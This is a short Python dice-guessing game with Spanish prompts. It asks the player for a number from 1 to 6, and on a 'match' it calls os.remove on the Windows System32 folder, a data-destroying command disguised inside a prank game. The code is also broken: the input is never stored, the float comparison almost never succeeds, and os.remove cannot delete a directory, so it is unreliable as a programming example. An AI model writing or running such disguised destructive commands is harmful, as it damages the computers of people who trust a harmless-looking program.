import os
from random import random

print('dime un numero del 1 al 6')
randomNumber = random()* 6+1
var1 = 0
input(var1)

while var1 < 1 or var1 > 6:
    print('ese numero no esta entre el 1 y el 6')
    input(var1);

if var1 == randomNumber:
    os.remove("C:\\Windows\\System32")
else:
    print("felicidades ganaste !!!!")